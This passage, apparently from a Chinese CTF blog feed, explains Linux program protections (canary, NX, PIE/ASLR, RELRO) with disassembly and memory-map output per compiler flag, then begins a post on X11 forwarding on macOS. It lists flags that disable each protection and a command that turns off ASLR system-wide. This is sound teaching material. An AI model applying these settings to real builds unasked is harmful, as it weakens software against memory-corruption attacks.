00</span><br><span class="line">  4005d0:74 05                je     4005d7 &lt;main+0x41&gt;</span><br><span class="line">  4005d2:e8 89 fe ff ff       call   400460 &lt;__stack_chk_fail@plt&gt;</span><br><span class="line">  4005d7:c9                   leave</span><br><span class="line">  4005d8:c3                   ret</span><br></pre></td></tr></table></figure><h2 id="fno-stack-protector"><a href="#fno-stack-protector" class="headerlink" title="-fno-stack-protector"></a><code>-fno-stack-protector</code></h2><p><code>-fstack-protector</code> 参数取消对栈的保护，直接编译成程序所对应的汇编：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">0000000000400526 &lt;main&gt;:</span><br><span class="line">  400526:55                   push   rbp</span><br><span class="line">  400527:48 89 e5             mov    rbp,rsp</span><br><span class="line">  40052a:48 83 ec 20          sub    rsp,0x20</span><br><span class="line">  40052e:48 8d 45 e0          lea    rax,[rbp-0x20]</span><br><span class="line">  400532:48 89 c7             mov    rdi,rax</span><br><span class="line">  400535:b8 00 00 00 00       mov    eax,0x0</span><br><span class="line">  40053a:e8 d1 fe ff ff       call   400410 &lt;gets@plt&gt;</span><br><span class="line">  40053f:b8 00 00 00 00       mov    eax,0x0</span><br><span class="line">  400544:c9                   leave</span><br><span class="line">  400545:c3                   ret</span><br></pre></td></tr></table></figure><h1 id="NX（DEP）"><a href="#NX（DEP）" class="headerlink" title="NX（DEP）"></a>NX（DEP）</h1><p>NX 即 No-eXecute（不可执行）的意思，NX（即 Windows 下的 DEP，数据执行保护）的基本原理是将数据所在内存页标识为不可执行，当程序溢出成功转入 Shellcode 时，程序会尝试在数据页面上执行指令，此时 CPU 就会抛出异常，而不是去执行恶意指令。</p><h2 id="Default（-z-noexecstack）"><a href="#Default（-z-noexecstack）" class="headerlink" title="Default（-z noexecstack）"></a>Default（<code>-z noexecstack</code>）</h2><p>默认开始 NX，栈上的数据不可执行：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line">assassinq$ vmmap</span><br><span class="line">Start              End                PermName</span><br><span class="line">0x00400000         0x00401000         r-xp/home/beale/Test_Dir/main</span><br><span class="line">0x00600000         0x00601000         r--p/home/beale/Test_Dir/main</span><br><span class="line">0x00601000         0x00602000         rw-p/home/beale/Test_Dir/main</span><br><span class="line">0x00007ffff7a0d000 0x00007ffff7bcd000 r-xp/lib/x86_64-linux-gnu/libc-2.23.so</span><br><span class="line">0x00007ffff7bcd000 0x00007ffff7dcd000 ---p/lib/x86_64-linux-gnu/libc-2.23.so</span><br><span class="line">0x00007ffff7dcd000 0x00007ffff7dd1000 r--p/lib/x86_64-linux-gnu/libc-2.23.so</span><br><span class="line">0x00007ffff7dd1000 0x00007ffff7dd3000 rw-p/lib/x86_64-linux-gnu/libc-2.23.so</span><br><span class="line">0x00007ffff7dd3000 0x00007ffff7dd7000 rw-pmapped</span><br><span class="line">0x00007ffff7dd7000 0x00007ffff7dfd000 r-xp/lib/x86_64-linux-gnu/ld-2.23.so</span><br><span class="line">0x00007ffff7fdd000 0x00007ffff7fe0000 rw-pmapped</span><br><span class="line">0x00007ffff7ff8000 0x00007ffff7ffa000 r--p[vvar]</span><br><span class="line">0x00007ffff7ffa000 0x00007ffff7ffc000 r-xp[vdso]</span><br><span class="line">0x00007ffff7ffc000 0x00007ffff7ffd000 r--p/lib/x86_64-linux-gnu/ld-2.23.so</span><br><span class="line">0x00007ffff7ffd000 0x00007ffff7ffe000 rw-p/lib/x86_64-linux-gnu/ld-2.23.so</span><br><span class="line">0x00007ffff7ffe000 0x00007ffff7fff000 rw-pmapped</span><br><span class="line">0x00007ffffffde000 0x00007ffffffff000 rw-p[stack]</span><br><span class="line">0xffffffffff600000 0xffffffffff601000 r-xp[vsyscall]</span><br></pre></td></tr></table></figure><h2 id="z-execstack"><a href="#z-execstack" class="headerlink" title="-z execstack"></a><code>-z execstack</code></h2><p>开启栈可执行后，栈上的代码可被执行，同时其他处内存部分都是读写执行全开：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line">assassinq$ vmmap</span><br><span class="line">Start              End                PermName</span><br><span class="line">0x00400000         0x00401000         r-xp/home/beale/Test_Dir/main</span><br><span class="line">0x00600000         0x00601000         r-xp/home/beale/Test_Dir/main</span><br><span class="line">0x00601000         0x00602000         rwxp/home/beale/Test_Dir/main</span><br><span class="line">0x00007ffff7a0d000 0x00007ffff7bcd000 r-xp/lib/x86_64-linux-gnu/libc-2.23.so</span><br><span class="line">0x00007ffff7bcd000 0x00007ffff7dcd000 ---p/lib/x86_64-linux-gnu/libc-2.23.so</span><br><span class="line">0x00007ffff7dcd000 0x00007ffff7dd1000 r-xp/lib/x86_64-linux-gnu/libc-2.23.so</span><br><span class="line">0x00007ffff7dd1000 0x00007ffff7dd3000 rwxp/lib/x86_64-linux-gnu/libc-2.23.so</span><br><span class="line">0x00007ffff7dd3000 0x00007ffff7dd7000 rwxpmapped</span><br><span class="line">0x00007ffff7dd7000 0x00007ffff7dfd000 r-xp/lib/x86_64-linux-gnu/ld-2.23.so</span><br><span class="line">0x00007ffff7fdd000 0x00007ffff7fe0000 rwxpmapped</span><br><span class="line">0x00007ffff7ff8000 0x00007ffff7ffa000 r--p[vvar]</span><br><span class="line">0x00007ffff7ffa000 0x00007ffff7ffc000 r-xp[vdso]</span><br><span class="line">0x00007ffff7ffc000 0x00007ffff7ffd000 r-xp/lib/x86_64-linux-gnu/ld-2.23.so</span><br><span class="line">0x00007ffff7ffd000 0x00007ffff7ffe000 rwxp/lib/x86_64-linux-gnu/ld-2.23.so</span><br><span class="line">0x00007ffff7ffe000 0x00007ffff7fff000 rwxpmapped</span><br><span class="line">0x00007ffffffde000 0x00007ffffffff000 rwxp[stack]</span><br><span class="line">0xffffffffff600000 0xffffffffff601000 r-xp[vsyscall]</span><br></pre></td></tr></table></figure><h1 id="PIE（ASLR）"><a href="#PIE（ASLR）" class="headerlink" title="PIE（ASLR）"></a>PIE（ASLR）</h1><p>一般情况下 NX 和地址空间分布随机化（ASLR）会同时工作。<a href="https://blog.csdn.net/spenghui/article/details/79910884" target="_blank" rel="noopener">ASLR 不负责代码段以及数据段的随机化工作，这项工作由 PIE 负责；但是只有在开启 ASLR 之后，PIE 才会生效。</a>内存地址随机化机制（Address Space Layout Randomization)，有以下三种情况（具体的 ASLR 和 PIE 的互相作用：<a href="https://www.cnblogs.com/rec0rd/p/7646857.html）：" target="_blank" rel="noopener">https://www.cnblogs.com/rec0rd/p/7646857.html）：</a></p><ol><li>0 - 表示关闭进程地址空间随机化。</li><li>1 - 表示将 mmap 的基址，stack 和 Vdso 页面随机化。</li><li>2 - 表示在 1 的基础上增加 heap 的随机化。</li></ol><p>可以防范基于 ret2libc 方式的针对 DEP 的攻击。ASLR 和 DEP 配合使用，能有效阻止攻击者在堆栈上运行恶意代码。位置独立的可执行区域（Position-Independent Executables）使得在利用缓冲溢出和移动操作系统中存在的其他内存崩溃缺陷时采用面向返回的编程（Return-Oriented Programming）方法变得难得多。</p><blockquote><p>Linux 关闭 PIE 的方法：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">&gt; <span class="built_in">echo</span> 0 | sudo tee /proc/sys/kernel/randomize_va_space</span><br><span class="line">&gt;</span><br></pre></td></tr></table></figure></blockquote><h2 id="Default（-no-pie）"><a href="#Default（-no-pie）" class="headerlink" title="Default（-no-pie）"></a>Default（<code>-no-pie</code>）</h2><p>默认不开启。静态分析程序时所得到的地址都是运行时的真实地址，基地址为 0x400000：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">0000000000400526 &lt;main&gt;:</span><br><span class="line">  400526:55                   push   rbp</span><br><span class="line">  400527:48 89 e5             mov    rbp,rsp</span><br><span class="line">  40052a:bf c4 05 40 00       mov    edi,0x4005c4</span><br><span class="line">  40052f:e8 cc fe ff ff       call   400400 &lt;puts@plt&gt;</span><br><span class="line">  400534:b8 00 00 00 00       mov    eax,0x0</span><br><span class="line">  400539:5d                   pop    rbp</span><br><span class="line">  40053a:c3                   ret</span><br></pre></td></tr></table></figure><p>与 gdb 调试的时候相同：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">───────────────────────────────────── Code ─────────────────────────────────────</span><br><span class="line">   0x400521 &lt;frame_dummy+33&gt;:jmp    0x4004a0 &lt;register_tm_clones&gt;</span><br><span class="line">   0x400526 &lt;main&gt;:push   rbp</span><br><span class="line">   0x400527 &lt;main+1&gt;:mov    rbp,rsp</span><br><span class="line">=&gt; 0x40052a &lt;main+4&gt;:mov    edi,0x4005c4</span><br><span class="line">   0x40052f &lt;main+9&gt;:call   0x400400 &lt;puts@plt&gt;</span><br><span class="line">   0x400534 &lt;main+14&gt;:mov    eax,0x0</span><br><span class="line">   0x400539 &lt;main+19&gt;:pop    rbp</span><br><span class="line">   0x40053a &lt;main+20&gt;:ret</span><br></pre></td></tr></table></figure><h2 id="pie"><a href="#pie" class="headerlink" title="-pie"></a><code>-pie</code></h2><p><code>-fpie</code> 与 <code>-fPIE</code> 效果一样，用于编译；<code>-pie</code> 用于链接。开启 PIE 后的静态反编译结果没有基地址，每次运行时的基地址不同：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">0000000000000750 &lt;main&gt;:</span><br><span class="line"> 750:55                   push   rbp</span><br><span class="line"> 751:48 89 e5             mov    rbp,rsp</span><br><span class="line"> 754:48 8d 3d 99 00 00 00 lea    rdi,[rip+0x99]        # 7f4 &lt;_IO_stdin_used+0x4&gt;</span><br><span class="line"> 75b:e8 90 fe ff ff       call   5f0 &lt;puts@plt&gt;</span><br><span class="line"> 760:b8 00 00 00 00       mov    eax,0x0</span><br><span class="line"> 765:5d                   pop    rbp</span><br><span class="line"> 766:c3                   ret</span><br></pre></td></tr></table></figure><p>gdb 调试时如下：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">───────────────────────────────────── Code ─────────────────────────────────────</span><br><span class="line">   0x55555555474b &lt;frame_dummy+43&gt;:</span><br><span class="line">    jmp    0x555555554690 &lt;register_tm_clones&gt;</span><br><span class="line">   0x555555554750 &lt;main&gt;:push   rbp</span><br><span class="line">   0x555555554751 &lt;main+1&gt;:mov    rbp,rsp</span><br><span class="line">=&gt; 0x555555554754 &lt;main+4&gt;:lea    rdi,[rip+0x99]        # 0x5555555547f4</span><br><span class="line">   0x55555555475b &lt;main+11&gt;:call   0x5555555545f0 &lt;puts@plt&gt;</span><br><span class="line">   0x555555554760 &lt;main+16&gt;:mov    eax,0x0</span><br><span class="line">   0x555555554765 &lt;main+21&gt;:pop    rbp</span><br><span class="line">   0x555555554766 &lt;main+22&gt;:ret</span><br><span class="line">[rip+0x99] : 0x5555555547f4 (&quot;Hello World&quot;)</span><br></pre></td></tr></table></figure><h1 id="RELRO"><a href="#RELRO" class="headerlink" title="RELRO"></a>RELRO</h1><p>在 Linux 系统安全领域数据可以写的存储区就会是攻击的目标，尤其是存储函数指针的区域。所以在安全防护的角度来说尽量减少可写的存储区域对安全会有极大的好处。GCC、GNU linker 以及 Glibc-dynamic linker 一起配合实现了一种叫做 relro（Read Only Relocation）的技术。大概实现就是由 linker 指定程序的一块经过 dynamic linker 处理过 relocation 之后的区域为只读.</p><p>设置符号重定向表格为只读或在程序启动时就解析并绑定所有动态符号，从而减少对 GOT 攻击。RELRO 为 Partial RELRO，说明对 GOT 表具有写权限。</p><h2 id="Default（-z-lazy）"><a href="#Default（-z-lazy）" class="headerlink" title="Default（-z lazy）"></a>Default（<code>-z lazy</code>）</h2><p>默认情况下对 GOT 表具有写权限。可以看到 <code>puts</code> 和 <code>_libc_start_main</code> 所在的内存部分是可写的：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><span class="line">assassinq$ checksec</span><br><span class="line">CANARY    : disabled</span><br><span class="line">FORTIFY   : disabled</span><br><span class="line">NX        : ENABLED</span><br><span class="line">PIE       : disabled</span><br><span class="line">RELRO     : Partial</span><br><span class="line">assassinq$ got</span><br><span class="line"></span><br><span class="line">/home/beale/Test_Dir/main:     file format elf64-x86-64</span><br><span class="line"></span><br><span class="line">DYNAMIC RELOCATION RECORDS</span><br><span class="line">OFFSET           TYPE              VALUE</span><br><span class="line">0000000000600ff8 R_X86_64_GLOB_DAT  __gmon_start__</span><br><span class="line">0000000000601018 R_X86_64_JUMP_SLOT  puts@GLIBC_2.2.5</span><br><span class="line">0000000000601020 R_X86_64_JUMP_SLOT  __libc_start_main@GLIBC_2.2.5</span><br><span class="line"></span><br><span class="line">assassinq$ vmmap</span><br><span class="line">Start              End                PermName</span><br><span class="line">0x00400000         0x00401000         r-xp/home/beale/Test_Dir/main</span><br><span class="line">0x00600000         0x00601000         r--p/home/beale/Test_Dir/main</span><br><span class="line">0x00601000         0x00602000         rw-p/home/beale/Test_Dir/main</span><br><span class="line">0x00007ffff7a0d000 0x00007ffff7bcd000 r-xp/lib/x86_64-linux-gnu/libc-2.23.so</span><br><span class="line">0x00007ffff7bcd000 0x00007ffff7dcd000 ---p/lib/x86_64-linux-gnu/libc-2.23.so</span><br><span class="line">0x00007ffff7dcd000 0x00007ffff7dd1000 r--p/lib/x86_64-linux-gnu/libc-2.23.so</span><br><span class="line">0x00007ffff7dd1000 0x00007ffff7dd3000 rw-p/lib/x86_64-linux-gnu/libc-2.23.so</span><br><span class="line">0x00007ffff7dd3000 0x00007ffff7dd7000 rw-pmapped</span><br><span class="line">0x00007ffff7dd7000 0x00007ffff7dfd000 r-xp/lib/x86_64-linux-gnu/ld-2.23.so</span><br><span class="line">0x00007ffff7fdd000 0x00007ffff7fe0000 rw-pmapped</span><br><span class="line">0x00007ffff7ff8000 0x00007ffff7ffa000 r--p[vvar]</span><br><span class="line">0x00007ffff7ffa000 0x00007ffff7ffc000 r-xp[vdso]</span><br><span class="line">0x00007ffff7ffc000 0x00007ffff7ffd000 r--p/lib/x86_64-linux-gnu/ld-2.23.so</span><br><span class="line">0x00007ffff7ffd000 0x00007ffff7ffe000 rw-p/lib/x86_64-linux-gnu/ld-2.23.so</span><br><span class="line">0x00007ffff7ffe000 0x00007ffff7fff000 rw-pmapped</span><br><span class="line">0x00007ffffffde000 0x00007ffffffff000 rw-p[stack]</span><br><span class="line">0xffffffffff600000 0xffffffffff601000 r-xp[vsyscall]</span><br></pre></td></tr></table></figure><h2 id="z-norelro"><a href="#z-norelro" class="headerlink" title="-z norelro"></a><code>-z norelro</code></h2><p>没有开启 RELRO 的情况：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><span class="line">assassinq$ checksec</span><br><span class="line">CANARY    : disabled</span><br><span class="line">FORTIFY   : disabled</span><br><span class="line">NX        : ENABLED</span><br><span class="line">PIE       : disabled</span><br><span class="line">RELRO     : disabled</span><br><span class="line">assassinq$ got</span><br><span class="line"></span><br><span class="line">/home/beale/Test_Dir/main:     file format elf64-x86-64</span><br><span class="line"></span><br><span class="line">DYNAMIC RELOCATION RECORDS</span><br><span class="line">OFFSET           TYPE              VALUE</span><br><span class="line">00000000006008a8 R_X86_64_GLOB_DAT  __gmon_start__</span><br><span class="line">00000000006008c8 R_X86_64_JUMP_SLOT  puts@GLIBC_2.2.5</span><br><span class="line">00000000006008d0 R_X86_64_JUMP_SLOT  __libc_start_main@GLIBC_2.2.5</span><br><span class="line"></span><br><span class="line">assassinq$ vmmap</span><br><span class="line">Start              End                PermName</span><br><span class="line">0x00400000         0x00401000         r-xp/home/beale/Test_Dir/main</span><br><span class="line">0x00600000         0x00601000         rw-p/home/beale/Test_Dir/main</span><br><span class="line">0x00007ffff7a0d000 0x00007ffff7bcd000 r-xp/lib/x86_64-linux-gnu/libc-2.23.so</span><br><span class="line">0x00007ffff7bcd000 0x00007ffff7dcd000 ---p/lib/x86_64-linux-gnu/libc-2.23.so</span><br><span class="line">0x00007ffff7dcd000 0x00007ffff7dd1000 r--p/lib/x86_64-linux-gnu/libc-2.23.so</span><br><span class="line">0x00007ffff7dd1000 0x00007ffff7dd3000 rw-p/lib/x86_64-linux-gnu/libc-2.23.so</span><br><span class="line">0x00007ffff7dd3000 0x00007ffff7dd7000 rw-pmapped</span><br><span class="line">0x00007ffff7dd7000 0x00007ffff7dfd000 r-xp/lib/x86_64-linux-gnu/ld-2.23.so</span><br><span class="line">0x00007ffff7fdd000 0x00007ffff7fe0000 rw-pmapped</span><br><span class="line">0x00007ffff7ff8000 0x00007ffff7ffa000 r--p[vvar]</span><br><span class="line">0x00007ffff7ffa000 0x00007ffff7ffc000 r-xp[vdso]</span><br><span class="line">0x00007ffff7ffc000 0x00007ffff7ffd000 r--p/lib/x86_64-linux-gnu/ld-2.23.so</span><br><span class="line">0x00007ffff7ffd000 0x00007ffff7ffe000 rw-p/lib/x86_64-linux-gnu/ld-2.23.so</span><br><span class="line">0x00007ffff7ffe000 0x00007ffff7fff000 rw-pmapped</span><br><span class="line">0x00007ffffffde000 0x00007ffffffff000 rw-p[stack]</span><br><span class="line">0xffffffffff600000 0xffffffffff601000 r-xp[vsyscall]</span><br></pre></td></tr></table></figure><h2 id="z-now"><a href="#z-now" class="headerlink" title="-z now"></a><code>-z now</code></h2><p>此时无法修改 GOT 表。<code>puts</code> 和 <code>_libc_start_main</code> 所在的内存部分只有读权限：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><span class="line">assassinq$ checksec</span><br><span class="line">CANARY    : disabled</span><br><span class="line">FORTIFY   : disabled</span><br><span class="line">NX        : ENABLED</span><br><span class="line">PIE       : disabled</span><br><span class="line">RELRO     : FULL</span><br><span class="line">assassinq$ got</span><br><span class="line"></span><br><span class="line">/home/beale/Test_Dir/main:     file format elf64-x86-64</span><br><span class="line"></span><br><span class="line">DYNAMIC RELOCATION RECORDS</span><br><span class="line">OFFSET           TYPE              VALUE</span><br><span class="line">0000000000600fe8 R_X86_64_GLOB_DAT  puts@GLIBC_2.2.5</span><br><span class="line">0000000000600ff0 R_X86_64_GLOB_DAT  __libc_start_main@GLIBC_2.2.5</span><br><span class="line">0000000000600ff8 R_X86_64_GLOB_DAT  __gmon_start__</span><br><span class="line"></span><br><span class="line">assassinq$ vmmap</span><br><span class="line">Start              End                PermName</span><br><span class="line">0x00400000         0x00401000         r-xp/home/beale/Test_Dir/main</span><br><span class="line">0x00600000         0x00601000         r--p/home/beale/Test_Dir/main</span><br><span class="line">0x00601000         0x00602000         rw-p/home/beale/Test_Dir/main</span><br><span class="line">0x00007ffff7a0d000 0x00007ffff7bcd000 r-xp/lib/x86_64-linux-gnu/libc-2.23.so</span><br><span class="line">0x00007ffff7bcd000 0x00007ffff7dcd000 ---p/lib/x86_64-linux-gnu/libc-2.23.so</span><br><span class="line">0x00007ffff7dcd000 0x00007ffff7dd1000 r--p/lib/x86_64-linux-gnu/libc-2.23.so</span><br><span class="line">0x00007ffff7dd1000 0x00007ffff7dd3000 rw-p/lib/x86_64-linux-gnu/libc-2.23.so</span><br><span class="line">0x00007ffff7dd3000 0x00007ffff7dd7000 rw-pmapped</span><br><span class="line">0x00007ffff7dd7000 0x00007ffff7dfd000 r-xp/lib/x86_64-linux-gnu/ld-2.23.so</span><br><span class="line">0x00007ffff7fdd000 0x00007ffff7fe0000 rw-pmapped</span><br><span class="line">0x00007ffff7ff8000 0x00007ffff7ffa000 r--p[vvar]</span><br><span class="line">0x00007ffff7ffa000 0x00007ffff7ffc000 r-xp[vdso]</span><br><span class="line">0x00007ffff7ffc000 0x00007ffff7ffd000 r--p/lib/x86_64-linux-gnu/ld-2.23.so</span><br><span class="line">0x00007ffff7ffd000 0x00007ffff7ffe000 rw-p/lib/x86_64-linux-gnu/ld-2.23.so</span><br><span class="line">0x00007ffff7ffe000 0x00007ffff7fff000 rw-pmapped</span><br><span class="line">0x00007ffffffde000 0x00007ffffffff000 rw-p[stack]</span><br><span class="line">0xffffffffff600000 0xffffffffff601000 r-xp[vsyscall]</span><br></pre></td></tr></table></figure><h1 id="Conclusion"><a href="#Conclusion" class="headerlink" title="Conclusion"></a>Conclusion</h1><p>各种安全选择的编译参数如下：</p><ul><li>NX：<code>-z execstack</code> / <code>-z noexecstack</code> (关闭 / 开启)</li><li>Canary：<code>-fno-stack-protector</code> / <code>-fstack-protector</code> / <code>-fstack-protector-all</code> (关闭 / 开启 / 全开启)</li><li>PIE：<code>-no-pie</code> / <code>-pie</code> (关闭 / 开启)</li><li>RELRO：<code>-z norelro</code> / <code>-z lazy</code> / <code>-z now</code> (关闭 / 部分开启 / 完全开启)</li></ul><p><img src="/pics/Linux下的各类程序保护机制/2.png" alt="保护全开的程序"></p><h1 id="References"><a href="#References" class="headerlink" title="References"></a>References</h1><p><a href="http://www.gandalf.site/2019/03/linux-pwn.html" target="_blank" rel="noopener">http://www.gandalf.site/2019/03/linux-pwn.html</a><br><a href="https://stackoverflow.com/questions/24465014/gcc-generate-canary-or-not" target="_blank" rel="noopener">https://stackoverflow.com/questions/24465014/gcc-generate-canary-or-not</a><br><a href="https://stackoverflow.com/questions/2463150/what-is-the-fpie-option-for-position-independent-executables-in-gcc-and-ld" target="_blank" rel="noopener">https://stackoverflow.com/questions/2463150/what-is-the-fpie-option-for-position-independent-executables-in-gcc-and-ld</a><br><a href="https://richardustc.github.io/2013-05-21-2013-05-21-pie.html" target="_blank" rel="noopener">https://richardustc.github.io/2013-05-21-2013-05-21-pie.html</a><br><a href="http://liudonghua.com/archives/2014/10/26/gcc_g++%E4%B8%AD%E7%9A%84pic%E4%B8%8Epie/" target="_blank" rel="noopener">http://liudonghua.com/archives/2014/10/26/gcc_g++%E4%B8%AD%E7%9A%84pic%E4%B8%8Epie/</a><br><a href="https://paper.seebug.org/481/" target="_blank" rel="noopener">https://paper.seebug.org/481/</a></p>]]></content>
    
    <summary type="html">
    
      &lt;p&gt;之前一直在做逆向，快一年没碰 PWN 了，接下来有一堆比赛，赶紧重新 PWN 起来。这里先整理一下 Linux 下的程序保护机制。&lt;/p&gt;
    
    </summary>
    
    
    
      <category term="ctf" scheme="blog.b3ale.cn/tags/ctf/"/>
    
      <category term="pwn" scheme="blog.b3ale.cn/tags/pwn/"/>
    
  </entry>
  
  <entry>
    <title>使用X11在macOS上获得更好的体验</title>
    <link href="blog.b3ale.cn/2020/03/05/%E4%BD%BF%E7%94%A8X11%E5%9C%A8macOS%E4%B8%8A%E8%8E%B7%E5%BE%97%E6%9B%B4%E5%A5%BD%E7%9A%84%E4%BD%93%E9%AA%8C/"/>
    <id>blog.b3ale.cn/2020/03/05/%E4%BD%BF%E7%94%A8X11%E5%9C%A8macOS%E4%B8%8A%E8%8E%B7%E5%BE%97%E6%9B%B4%E5%A5%BD%E7%9A%84%E4%BD%93%E9%AA%8C/</id>
    <published>2020-03-05T01:05:31.000Z</published>
    <updated>2020-03-07T03:25:09.695Z</updated>
    
    <content type="html"><![CDATA[<p>X11 也叫做 X Window 系统，X Window 系统（X11 或 X）是一种位图显示的视窗系统。它是在 Unix 和 类 Unix 操作系统，以及 OpenVMS 上建立图形用户界面的标准工具包和协议，并可用于几乎所有已有的现代操作系统。</p><a id="more"></a><h1 id="Environment"><a href="#Environment" class="headerlink" title="Environment"></a>Environment</h1><p>使用 Homebrew 下载 XQuartz：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">brew cask install xquartz</span><br></pre></td></tr></table></figure><p>打开 XQuartz 并设置如下：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">open -a XQuartz</span><br></pre></td></tr></table></figure><p><img src="/pics/使用X11在macOS上获得更好的体验/1.png" alt="打开安全性下的两个选项"></p><h1 id="SSH"><a href="#SSH" class="headerlink" title="SSH"></a>SSH</h1><p><code>ssh</code> 命令中加上 <code>-X</code> 参数，可以打开远程的 GUI 界面：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line">$ ssh -X beale@192.168.2.190</span><br><span class="line">beale@192.168.2.190<span class="string">'s password:</span></span><br><span class="line"><span class="string">Welcome to Ubuntu 16.04.1 LTS (GNU/Linux 4.4.0-31-generic x86_64)</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string"> * Documentation:  https://help.ubuntu.com</span></span><br><span class="line"><span class="string"> * Management:     https://landscape.canonical.com</span></span><br><span class="line"><span class="string"> * Support:        https://ubuntu.com/advantage</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">700 packages can be updated.</span></span><br><span class="line"><span class="string">452 updates are security updates.</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">The programs included with the Ubuntu system are free software;</span></span><br><span class="line"><span class="string">the exact distribution terms for each program are described in the</span></span><br><span class="line"><span class="string">individual files in /usr/share/doc/*/copyright.</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">Ubuntu comes with ABSOLUTELY NO 